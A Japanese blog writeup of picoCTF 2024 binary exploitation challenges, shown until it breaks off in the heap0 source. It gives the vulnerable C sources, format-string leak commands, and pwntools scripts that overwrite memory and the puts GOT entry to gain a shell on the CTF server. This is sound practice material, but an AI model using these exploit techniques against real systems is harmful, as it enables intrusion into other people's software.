<script lang="ts">
</script>

<p>PicoCTF 2024に参加したのでWriteupを書きました。
解いた問題は以下の通り。</p>
<ul>
<li>Binary Exploitation
<ul>
<li>[x] format string0</li>
<li>[x] format string1</li>
<li>[x] format string2</li>
<li>[x] format string3</li>
<li>[x] heap 0</li>
<li>[x] heap 1</li>
<li>[x] heap 2</li>
<li>[x] heap 3</li>
<li>[ ] babygame03</li>
<li>[ ] high frequency troubles</li>
</ul>
</li>
<li>Cryptography
<ul>
<li>[x] interencdec</li>
<li>[x] custom encryption</li>
<li>[ ] c3</li>
<li>[ ] rsa_oracle</li>
<li>[ ] flag_printer</li>
</ul>
</li>
<li>Forensics
<ul>
<li>[x] scan surprise</li>
<li>[x] verify</li>
<li>[x] canyousee</li>
<li>[x] secret of the polyglot</li>
<li>[x] mob psycho</li>
<li>[x] endianness-v2</li>
<li>[ ] blast from the past</li>
<li>[ ] dear diary</li>
</ul>
</li>
<li>General Skills
<ul>
<li>[x] super ssh</li>
<li>[x] commitment issues</li>
<li>[x] time machine</li>
<li>[x] blame game</li>
<li>[x] collaborative development</li>
<li>[x] binhexa</li>
<li>[x] binary search</li>
<li>[x] endianness</li>
<li>[x] dont-you-love-banners</li>
<li>[ ] sansalpha</li>
</ul>
</li>
<li>Reverse Engineering
<ul>
<li>[x] packer</li>
<li>[x] factcheck</li>
<li>[ ] winantidbg0x100</li>
<li>[x] classic crackme 0x100</li>
<li>[ ] weirdsnake</li>
<li>[ ] winantidbg0x200</li>
<li>[ ] winantidbg0x300</li>
</ul>
</li>
<li>Web Exploitation
<ul>
<li>[x] bookmarklet</li>
<li>[x] webdecode</li>
<li>[x] introtoburp</li>
<li>[x] unminify</li>
<li>[x] no sql injection</li>
<li>[x] trickster</li>
<li>[ ] elements</li>
</ul>
</li>
</ul>
<p>去年よりも成長していて嬉しい。</p>
<h1>Binary Exploitation</h1>
<h2>format string 0</h2>
<p>ソースコードが渡された。</p>
<pre style="background-color:#292828;"><code class="language-c"><span style="color:#d4be98;">#include &lt;stdio.h&gt;
</span><span style="color:#d4be98;">#include &lt;stdlib.h&gt;
</span><span style="color:#d4be98;">#include &lt;string.h&gt;
</span><span style="color:#d4be98;">#include &lt;signal.h&gt;
</span><span style="color:#d4be98;">#include &lt;unistd.h&gt;
</span><span style="color:#d4be98;">#include &lt;sys/types.h&gt;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">#define BUFSIZE 32
</span><span style="color:#d4be98;">#define FLAGSIZE 64
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">char flag[FLAGSIZE];
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void sigsegv_handler(int sig) &#123;
</span><span style="color:#d4be98;">    printf(&quot;\n%s\n&quot;, flag);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">    exit(1);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">int on_menu(char *burger, char *menu[], int count) &#123;
</span><span style="color:#d4be98;">    for (int i = 0; i &lt; count; i++) &#123;
</span><span style="color:#d4be98;">        if (strcmp(burger, menu[i]) == 0)
</span><span style="color:#d4be98;">            return 1;
</span><span style="color:#d4be98;">    &#125;
</span><span style="color:#d4be98;">    return 0;
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void serve_patrick();
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void serve_bob();
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">int main(int argc, char **argv)&#123;
</span><span style="color:#d4be98;">    FILE *f = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
</span><span style="color:#d4be98;">    if (f == NULL) &#123;
</span><span style="color:#d4be98;">        printf(&quot;%s %s&quot;, &quot;Please create &#39;flag.txt&#39; in this directory with your&quot;,
</span><span style="color:#d4be98;">                        &quot;own debugging flag.\n&quot;);
</span><span style="color:#d4be98;">        exit(0);
</span><span style="color:#d4be98;">    &#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    fgets(flag, FLAGSIZE, f);
</span><span style="color:#d4be98;">    signal(SIGSEGV, sigsegv_handler);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    gid_t gid = getegid();
</span><span style="color:#d4be98;">    setresgid(gid, gid, gid);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    serve_patrick();
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    return 0;
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void serve_patrick() &#123;
</span><span style="color:#d4be98;">    printf(&quot;%s %s\n%s\n%s %s\n%s&quot;,
</span><span style="color:#d4be98;">            &quot;Welcome to our newly-opened burger place Pico &#39;n Patty!&quot;,
</span><span style="color:#d4be98;">            &quot;Can you help the picky customers find their favorite burger?&quot;,
</span><span style="color:#d4be98;">            &quot;Here comes the first customer Patrick who wants a giant bite.&quot;,
</span><span style="color:#d4be98;">            &quot;Please choose from the following burgers:&quot;,
</span><span style="color:#d4be98;">            &quot;Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe&quot;,
</span><span style="color:#d4be98;">            &quot;Enter your recommendation: &quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    char choice1[BUFSIZE];
</span><span style="color:#d4be98;">    scanf(&quot;%s&quot;, choice1);
</span><span style="color:#d4be98;">    char *menu1[3] = &#123;&quot;Breakf@st_Burger&quot;, &quot;Gr%114d_Cheese&quot;, &quot;Bac0n_D3luxe&quot;&#125;;
</span><span style="color:#d4be98;">    if (!on_menu(choice1, menu1, 3)) &#123;
</span><span style="color:#d4be98;">        printf(&quot;%s&quot;, &quot;There is no such burger yet!\n&quot;);
</span><span style="color:#d4be98;">        fflush(stdout);
</span><span style="color:#d4be98;">    &#125; else &#123;
</span><span style="color:#d4be98;">        int count = printf(choice1);
</span><span style="color:#d4be98;">        if (count &gt; 2 * BUFSIZE) &#123;
</span><span style="color:#d4be98;">            serve_bob();
</span><span style="color:#d4be98;">        &#125; else &#123;
</span><span style="color:#d4be98;">            printf(&quot;%s\n%s\n&quot;,
</span><span style="color:#d4be98;">                    &quot;Patrick is still hungry!&quot;,
</span><span style="color:#d4be98;">                    &quot;Try to serve him something of larger size!&quot;);
</span><span style="color:#d4be98;">            fflush(stdout);
</span><span style="color:#d4be98;">        &#125;
</span><span style="color:#d4be98;">    &#125;
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void serve_bob() &#123;
</span><span style="color:#d4be98;">    printf(&quot;\n%s %s\n%s %s\n%s %s\n%s&quot;,
</span><span style="color:#d4be98;">            &quot;Good job! Patrick is happy!&quot;,
</span><span style="color:#d4be98;">            &quot;Now can you serve the second customer?&quot;,
</span><span style="color:#d4be98;">            &quot;Sponge Bob wants something outrageous that would break the shop&quot;,
</span><span style="color:#d4be98;">            &quot;(better be served quick before the shop owner kicks you out!)&quot;,
</span><span style="color:#d4be98;">            &quot;Please choose from the following burgers:&quot;,
</span><span style="color:#d4be98;">            &quot;Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak&quot;,
</span><span style="color:#d4be98;">            &quot;Enter your recommendation: &quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    char choice2[BUFSIZE];
</span><span style="color:#d4be98;">    scanf(&quot;%s&quot;, choice2);
</span><span style="color:#d4be98;">    char *menu2[3] = &#123;&quot;Pe%to_Portobello&quot;, &quot;$outhwest_Burger&quot;, &quot;Cla%sic_Che%s%steak&quot;&#125;;
</span><span style="color:#d4be98;">    if (!on_menu(choice2, menu2, 3)) &#123;
</span><span style="color:#d4be98;">        printf(&quot;%s&quot;, &quot;There is no such burger yet!\n&quot;);
</span><span style="color:#d4be98;">        fflush(stdout);
</span><span style="color:#d4be98;">    &#125; else &#123;
</span><span style="color:#d4be98;">        printf(choice2);
</span><span style="color:#d4be98;">        fflush(stdout);
</span><span style="color:#d4be98;">    &#125;
</span><span style="color:#d4be98;">&#125;
</span></code></pre>
<p>入力に<code>&#123;&quot;Breakf@st_Burger&quot;, &quot;Gr%114d_Cheese&quot;, &quot;Bac0n_D3luxe&quot;&#125;</code>以外の文字列が含まれていた場合、入力がそのまま<code>printf</code>に渡されている。また、<code>main</code>関数内でflagを読み込んでいる。よって、普通にメモリをリークすれば良い。
<em>command:</em></p>
<pre style="background-color:#292828;"><code class="language-bash"><span style="color:#d4be98;">python -c &#39;print(&quot;%s&quot; * 24)&#39; | ./format-string-0
</span></code></pre>
<p><em>output:</em></p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">Welcome to our newly-opened burger place Pico &#39;n Patty! Can you help the picky customers find their favorite burger?
</span><span style="color:#d4be98;">Here comes the first customer Patrick who wants a giant bite.
</span><span style="color:#d4be98;">Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
</span><span style="color:#d4be98;">Enter your recommendation: There is no such burger yet!
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">picoCTF&#123;fake_local_flag&#125;
</span></code></pre>
<h2>format string 1</h2>
<p>ソースコードが渡された。</p>
<pre style="background-color:#292828;"><code class="language-c"><span style="color:#d4be98;">#include &lt;stdio.h&gt;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">int main() &#123;
</span><span style="color:#d4be98;">  char buf[1024];
</span><span style="color:#d4be98;">  char secret1[64];
</span><span style="color:#d4be98;">  char flag[64];
</span><span style="color:#d4be98;">  char secret2[64];
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">  // Read in first secret menu item
</span><span style="color:#d4be98;">  FILE *fd = fopen(&quot;secret-menu-item-1.txt&quot;, &quot;r&quot;);
</span><span style="color:#d4be98;">  if (fd == NULL)&#123;
</span><span style="color:#d4be98;">    printf(&quot;&#39;secret-menu-item-1.txt&#39; file not found, aborting.\n&quot;);
</span><span style="color:#d4be98;">    return 1;
</span><span style="color:#d4be98;">  &#125;
</span><span style="color:#d4be98;">  fgets(secret1, 64, fd);
</span><span style="color:#d4be98;">  // Read in the flag
</span><span style="color:#d4be98;">  fd = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
</span><span style="color:#d4be98;">  if (fd == NULL)&#123;
</span><span style="color:#d4be98;">    printf(&quot;&#39;flag.txt&#39; file not found, aborting.\n&quot;);
</span><span style="color:#d4be98;">    return 1;
</span><span style="color:#d4be98;">  &#125;
</span><span style="color:#d4be98;">  fgets(flag, 64, fd);
</span><span style="color:#d4be98;">  // Read in second secret menu item
</span><span style="color:#d4be98;">  fd = fopen(&quot;secret-menu-item-2.txt&quot;, &quot;r&quot;);
</span><span style="color:#d4be98;">  if (fd == NULL)&#123;
</span><span style="color:#d4be98;">    printf(&quot;&#39;secret-menu-item-2.txt&#39; file not found, aborting.\n&quot;);
</span><span style="color:#d4be98;">    return 1;
</span><span style="color:#d4be98;">  &#125;
</span><span style="color:#d4be98;">  fgets(secret2, 64, fd);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">  printf(&quot;Give me your order and I&#39;ll read it back to you:\n&quot;);
</span><span style="color:#d4be98;">  fflush(stdout);
</span><span style="color:#d4be98;">  scanf(&quot;%1024s&quot;, buf);
</span><span style="color:#d4be98;">  printf(&quot;Here&#39;s your order: &quot;);
</span><span style="color:#d4be98;">  printf(buf);
</span><span style="color:#d4be98;">  printf(&quot;\n&quot;);
</span><span style="color:#d4be98;">  fflush(stdout);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">  printf(&quot;Bye!\n&quot;);
</span><span style="color:#d4be98;">  fflush(stdout);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">  return 0;
</span><span style="color:#d4be98;">&#125;
</span></code></pre>
<p><code>scanf</code>で入力を受け取り、そのまま<code>printf</code>に渡している。
format string0と同じように%sを大量に渡してメモリリークをしようとすると<code>segmentation fault</code>が起こってしまうので、<code>%x</code>でリークして文字列に変換する。
<em>command1:</em></p>
<pre style="background-color:#292828;"><code class="language-bash"><span style="color:#d4be98;">python -c &#39;print(&quot;%lx.&quot;*20)&#39; | ./format-string-1
</span></code></pre>
<p><em>output1:</em></p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">Give me your order and I&#39;ll read it back to you:
</span><span style="color:#d4be98;">Here&#39;s your order: 7ffdf8a41a10.0.0.a.400.9.0.0.7ac85b362ab0.7ffd00000000.7ffdf8a41c38.0.7ffdf8a41c40.7b4654436f636970.636f6c5f656b6166.7d67616c665f6c61.a.0.7ac85b3577b7.7ac85b363680.
</span><span style="color:#d4be98;">Bye!
</span></code></pre>
<p><em>command2:</em></p>
<pre style="background-color:#292828;"><code class="language-bash"><span style="color:#d4be98;">python decode.py 7ffdf8a41a10.0.0.a.400.9.0.0.7ac85b362ab0.7ffd00000000.7ffdf8a41c38.0.7ffdf8a41c40.7b4654436f636970.636f6c5f656b6166.7d67616c665f6c61.a.0.7ac85b3577b7.7ac85b363680
</span></code></pre>
<p><em>output2:</em></p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">b&#39;\x10\x1a\xa4\xf8\xfd\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb0*6[\xc8z\x00\x00\x00\x00\x00\x00\xfd\x7f\x00\x008\x1c\xa4\xf8\xfd\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x1c\xa4\xf8\xfd\x7f\x00\x00picoCTF&#123;fake_local_flag&#125;\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb7w5[\xc8z\x00\x00\x8066[\xc8z\x00\x00&#39;
</span></code></pre>
<h2>format string2</h2>
<p>ソースコードが渡された。</p>
<pre style="background-color:#292828;"><code class="language-c"><span style="color:#d4be98;">#include &lt;stdio.h&gt;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">int sus = 0x21737573;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">int main() &#123;
</span><span style="color:#d4be98;">  char buf[1024];
</span><span style="color:#d4be98;">  char flag[64];
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">  printf(&quot;You don&#39;t have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n&quot;);
</span><span style="color:#d4be98;">  fflush(stdout);
</span><span style="color:#d4be98;">  scanf(&quot;%1024s&quot;, buf);
</span><span style="color:#d4be98;">  printf(&quot;Here&#39;s your input: &quot;);
</span><span style="color:#d4be98;">  printf(buf);
</span><span style="color:#d4be98;">  printf(&quot;\n&quot;);
</span><span style="color:#d4be98;">  fflush(stdout);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">  if (sus == 0x67616c66) &#123;
</span><span style="color:#d4be98;">    printf(&quot;I have NO clue how you did that, you must be a wizard. Here you go...\n&quot;);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    // Read in the flag
</span><span style="color:#d4be98;">    FILE *fd = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
</span><span style="color:#d4be98;">    fgets(flag, 64, fd);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    printf(&quot;%s&quot;, flag);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">  &#125;
</span><span style="color:#d4be98;">  else &#123;
</span><span style="color:#d4be98;">    printf(&quot;sus = 0x%x\n&quot;, sus);
</span><span style="color:#d4be98;">    printf(&quot;You can do better!\n&quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">  &#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">  return 0;
</span><span style="color:#d4be98;">&#125;
</span></code></pre>
<p>format stringで<code>sus</code>の値を改変できれば良い。
pwntoolsを使って自動化した。</p>
<pre style="background-color:#292828;"><code class="language-python"><span style="color:#d4be98;">#!/usr/bin/env python
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">import pwn
</span><span style="color:#d4be98;">import sys
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">exe = pwn.ELF(&quot;./vuln&quot;)
</span><span style="color:#d4be98;">pwn.context.binary = exe
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def connect(remote: bool):
</span><span style="color:#d4be98;">    if remote:
</span><span style="color:#d4be98;">        return pwn.remote(&quot;rhea.picoctf.net&quot;, 51654)
</span><span style="color:#d4be98;">    else:
</span><span style="color:#d4be98;">        return pwn.process(exe.path)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def send(p):
</span><span style="color:#d4be98;">    io = connect(False)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    pwn.log.info(&quot;payload  = %s&quot; % repr(p))
</span><span style="color:#d4be98;">    io.sendline(p)
</span><span style="color:#d4be98;">    resp = io.recvall()
</span><span style="color:#d4be98;">    if b&quot;picoCTF&quot; in resp:
</span><span style="color:#d4be98;">        pwn.log.info(&quot;Flag = %s&quot; % resp)
</span><span style="color:#d4be98;">    return resp
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">sus_addr = 0x404060
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">fs = pwn.FmtStr(execute_fmt=send)
</span><span style="color:#d4be98;">fs.write(sus_addr, 0x67616C66)
</span><span style="color:#d4be98;">fs.execute_writes()
</span></code></pre>
<h2>format string 3</h2>
<p>ソースコードが渡された。</p>
<pre style="background-color:#292828;"><code class="language-c"><span style="color:#d4be98;">#include &lt;stdio.h&gt;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">#define MAX_STRINGS 32
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">char *normal_string = &quot;/bin/sh&quot;;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void setup() &#123;
</span><span style="color:#d4be98;">        setvbuf(stdin, NULL, _IONBF, 0);
</span><span style="color:#d4be98;">        setvbuf(stdout, NULL, _IONBF, 0);
</span><span style="color:#d4be98;">        setvbuf(stderr, NULL, _IONBF, 0);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void hello() &#123;
</span><span style="color:#d4be98;">        puts(&quot;Howdy gamers!&quot;);
</span><span style="color:#d4be98;">        printf(&quot;Okay I&#39;ll be nice. Here&#39;s the address of setvbuf in libc: %p\n&quot;, &amp;setvbuf);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">int main() &#123;
</span><span style="color:#d4be98;">        char *all_strings[MAX_STRINGS] = &#123;NULL&#125;;
</span><span style="color:#d4be98;">        char buf[1024] = &#123;&#39;\0&#39;&#125;;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">        setup();
</span><span style="color:#d4be98;">        hello();
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">        fgets(buf, 1024, stdin);
</span><span style="color:#d4be98;">        printf(buf);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">        puts(normal_string);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">        return 0;
</span><span style="color:#d4be98;">&#125;
</span></code></pre>
<p><code>main</code>関数の最後に<code>&quot;/bin/sh&quot;</code>を<code>puts</code>に渡すというこれ見よがしな処理をしている。
また、明らかなformat stringの脆弱性がある。よって、format stringで<code>puts</code>のGOTを<code>system</code>に書き換えればシェルが取れそう。</p>
<pre style="background-color:#292828;"><code class="language-python"><span style="color:#d4be98;">#!/usr/bin/env python3
</span><span style="color:#d4be98;">import pwn
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">exe = pwn.ELF(&quot;./format-string-3_patched&quot;)
</span><span style="color:#d4be98;">libc = pwn.ELF(&quot;./libc.so.6&quot;)
</span><span style="color:#d4be98;">ld = pwn.ELF(&quot;./ld-linux-x86-64.so.2&quot;)
</span><span style="color:#d4be98;">pwn.context.binary = exe
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">payload = b&quot;&quot;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def connect():
</span><span style="color:#d4be98;">    # io = pwn.process(exe.path)
</span><span style="color:#d4be98;">    io = pwn.remote(&quot;rhea.picoctf.net&quot;, 64906)
</span><span style="color:#d4be98;">    return io
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def b(x):
</span><span style="color:#d4be98;">    return x.to_bytes(8, &quot;little&quot;)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def send(p):
</span><span style="color:#d4be98;">    global payload
</span><span style="color:#d4be98;">    io = pwn.process(exe.path)
</span><span style="color:#d4be98;">    io.sendline(p)
</span><span style="color:#d4be98;">    payload = p
</span><span style="color:#d4be98;">    resp = io.recvall()
</span><span style="color:#d4be98;">    return resp
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def main():
</span><span style="color:#d4be98;">    io = connect()
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    io.recvuntil(b&quot;setvbuf in libc: &quot;)
</span><span style="color:#d4be98;">    leak = int(io.recvline().strip(), 16)
</span><span style="color:#d4be98;">    libc.address = leak - libc.symbols[&quot;setvbuf&quot;]
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    pwn.log.info(&quot;libc.address = %s&quot; % hex(libc.address))
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    fs = pwn.FmtStr(execute_fmt=send)
</span><span style="color:#d4be98;">    fs.write(exe.got[&quot;puts&quot;], libc.symbols[&quot;system&quot;])
</span><span style="color:#d4be98;">    fs.execute_writes()
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    with open(&quot;./payload&quot;, &quot;wb&quot;) as f:
</span><span style="color:#d4be98;">        f.write(payload)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    io.sendline(payload)
</span><span style="color:#d4be98;">    io.recvuntil(b&quot;\x18@@&quot;)
</span><span style="color:#d4be98;">    io.interactive()
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">if __name__ == &quot;__main__&quot;:
</span><span style="color:#d4be98;">    main()
</span></code></pre>
<h2>heap0</h2>
<p>ソースコードが渡された。</p>
<pre style="background-color:#292828;"><code class="language-c"><span style="color:#d4be98;">#include &lt;stdio.h&gt;
</span><span style="color:#d4be98;">#include &lt;stdlib.h&gt;
</span><span style="color:#d4be98;">#include &lt;string.h&gt;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">#define FLAGSIZE_MAX 64
</span><span style="color:#d4be98;">// amount of memory allocated for input_data
</span><span style="color:#d4be98;">#define INPUT_DATA_SIZE 5
</span><span style="color:#d4be98;">// amount of memory allocated for safe_var
</span><span style="color:#d4be98;">#define SAFE_VAR_SIZE 5
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">int num_allocs;
</span><span style="color:#d4be98;">char *safe_var;
</span><span style="color:#d4be98;">char *input_data;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void check_win() &#123;
</span><span style="color:#d4be98;">    if (strcmp(safe_var, &quot;bico&quot;) != 0) &#123;
</span><span style="color:#d4be98;">        printf(&quot;\nYOU WIN\n&quot;);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">        // Print flag
</span><span style="color:#d4be98;">        char buf[FLAGSIZE_MAX];
</span><span style="color:#d4be98;">        FILE *fd = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
</span><span style="color:#d4be98;">        fgets(buf, FLAGSIZE_MAX, fd);
</span><span style="color:#d4be98;">        printf(&quot;%s\n&quot;, buf);
</span><span style="color:#d4be98;">        fflush(stdout);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">        exit(0);
</span><span style="color:#d4be98;">    &#125; else &#123;
</span><span style="color:#d4be98;">        printf(&quot;Looks like everything is still secure!\n&quot;);
</span><span style="color:#d4be98;">        printf(&quot;\nNo flage for you :(\n&quot;);
</span><span style="color:#d4be98;">        fflush(stdout);
</span><span style="color:#d4be98;">    &#125;
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void print_menu() &#123;
</span><span style="color:#d4be98;">    printf(&quot;\n1. Print Heap:\t\t(print the current state of the heap)&quot;
</span><span style="color:#d4be98;">           &quot;\n2. Write to buffer:\t(write to your own personal block of data &quot;
</span><span style="color:#d4be98;">           &quot;on the heap)&quot;
</span><span style="color:#d4be98;">           &quot;\n3. Print safe_var:\t(I&#39;ll even let you look at my variable on &quot;
</span><span style="color:#d4be98;">           &quot;the heap, &quot;
</span><span style="color:#d4be98;">           &quot;I&#39;m confident it can&#39;t be modified)&quot;
</span><span style="color:#d4be98;">           &quot;\n4. Print Flag:\t\t(Try to print the flag, good luck)&quot;
</span><span style="color:#d4be98;">           &quot;\n5. Exit\n\nEnter your choice: &quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void init() &#123;
</span><span style="color:#d4be98;">    printf(&quot;\nWelcome to heap0!\n&quot;);
</span><span style="color:#d4be98;">    printf(
</span><span style="color:#d4be98;">        &quot;I put my data on the heap so it should be safe from any tampering.\n&quot;);
</span><span style="color:#d4be98;">    printf(&quot;Since my data isn&#39;t on the stack I&#39;ll even let you write whatever &quot;
</span><span style="color:#d4be98;">           &quot;info you want to the heap, I already took care of using malloc for &quot;
</span><span style="color:#d4be98;">           &quot;you.\n\n&quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">    input_data = malloc(INPUT_DATA_SIZE);
</span><span style="color:#d4be98;">    strncpy(input_data, &quot;pico&quot;, INPUT_DATA_SIZE);
</span><span style="color:#d4be98;">    safe_var = malloc(SAFE_VAR_SIZE);
</span><span style="color:#d4be98;">    strncpy(safe_var, &quot;bico&quot;, SAFE_VAR_SIZE);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void write_buffer() &#123;
</span><span style="color:#d4be98;">    printf(&quot;Data for buffer: &quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">    scanf(&quot;%s&quot;, input_data);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void print_heap() &#123;
</span><span style="color:#d4be98;">    printf(&quot;Heap State:\n&quot;);
</span><span style="color:#d4be98;">    printf(&quot;+-------------+----------------+\n&quot;);
</span><span style="color:#d4be98;">    printf(&quot;[*] Address   -&gt;   Heap Data   \n&quot;);
</span><span style="color:#d4be98;">    printf(&quot;+-------------+----------------+\n&quot;);
</span><span style="color:#d4be98;">    printf(&quot;[*]   %p  -&gt;   %s\n&quot;, input_data, input_data);
</span><span style="color:#d4be98;">    printf(&quot;+-------------+----------------+\n&quot;);
</span><span style="color:#d4be98;">    printf(&quot;[*]   %p  -&gt;   %s\n&quot;, safe_var, safe_var);
</span><span style="color:#d4be98;">    printf(&quot;+-------------+----------------+\n&quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">int main(void) &#123;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    // Setup
</span><span style="color:#d4be98;">    init();
</span><span style="color:#d4be98;">    print_heap();
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    int choice;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    while (1) &#123;
</span><span style="color:#d4be98;">        print_menu();
</span><span style="color:#d4be98;">        int rval = scanf(&quot;%d&quot;, &amp;choice);
</span><span style="color:#d4be98;">        if (rval == EOF)&#123;
</span><span style="color:#d4be98;">            exit(0);
</span><span style="color:#d4be98;">        &#125;
</span><span style="color:#d4be98;">        if (rval != 1) &#123;
</span><span style="color:#d4be98;">            //printf(&quot;Invalid input. Please enter a valid choice.\n&quot;);
</span><span style="color:#d4be98;">            //fflush(stdout);
</span><span style="color:#d4be98;">            // Clear input buffer
</span><span style="color:#d4be98;">            //while (getchar() != &#39;\n&#39;);
</span><span style="color:#d4be98;">            //continue;
</span><span style="color:#d4be98;">            exit(0);
</span><span style="color:#d4be98;">        &#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">        switch (choice) &#123;
</span><span style="color:#d4be98;">        case 1:
</span><span style="color:#d4be98;">            // print heap
</span><span style="color:#d4be98;">            print_heap();
</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        case 2:
</span><span style="color:#d4be98;">            write_buffer();
</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        case 3:
</span><span style="color:#d4be98;">            // print safe_var
</span><span style="color:#d4be98;">            printf(&quot;\n\nTake a look at my variable: safe_var = %s\n\n&quot;,
</span><span style="color:#d4be98;">                   safe_var);
</span><span style="color:#d4be98;">            fflush(stdout);
</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        case 4:
</span><span style="color:#d4be98;">            // Check for win condition
</span><span style="color:#d4be98;">            check_win();
